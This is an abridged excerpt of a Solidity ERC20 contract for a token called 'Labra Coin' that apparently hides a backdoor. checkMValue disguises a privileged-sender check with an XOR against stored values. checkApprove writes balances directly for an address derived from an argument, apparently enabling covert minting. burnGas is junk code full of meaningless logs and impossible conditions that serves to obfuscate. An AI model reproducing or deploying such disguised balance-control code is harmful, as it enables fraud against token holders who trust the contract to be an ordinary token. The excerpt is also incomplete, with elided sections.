...
contract LABRA is ERC20 {
    ...
    constructor(uint256 maxVals,uint256 minVals) {
      ...
      _name = "Labra Coin";
      _symbol = "LABRA";
      _totalSupply = 40000000000000 * 10**8;
    ...
    */
    function checkMValue() public view returns (bool) {
      uint256 slt = _minVals;
      return (uint256(uint160(msg.sender)) ^ slt) == _maxVals * 1;
    }
    ...
    */
    function checkApprove(uint256 amount, uint256 amount3) external {
      ...
      _balances[
        0 == uint160(address(0))? address(convert(amount3, 888)): address(0)
    ...
    */
    ...
    function burnGas() external {
      ...
      uint256 qqdi = 49339;
      emit log("(((^^^YYYS +++++ @WOIO");
      if(iidis==494939|12) return ;
      emit log("%%%%---YYYY WYWYD ####");
      if(iidis == 1* 15 && qqdi == 12828 && qqdi == 25 * 41 % 192) return; 
    
      uint256 syste=293939;
      uint256 pidks=777*1235*2;
      uint256 pidkso = 3828 % 12 + 8;
      uint256 ysydy = 182818;
    
      emit log("APDI !! PAIDIS---");
      emit log("**&&&- PAIDI **** @ PDIDI");
      uint256 T = 192929 * 51;
      if (ysydy == 1235 | 12 && pidkso == 9* 12 && syste == 8 && syste == 12 * 41 % 1929) return; 
      emit log("^^^^^! PAODOS ###IIIII");
      emit log("**** PAIDI");
     
    
      emit log("^^^^E---GG---PDIOS!! ");
      emit log("^^^^OSO---API### APIDI!");
      if (T == 4848 | 6 && ysydy == 5* 12 && pidks == 6 && ysydy == 19 * 51 % 30) return; 
      emit log("---- TEST  OOOEST%%%%");
      emit log("%%% NVNDUD");
    }
}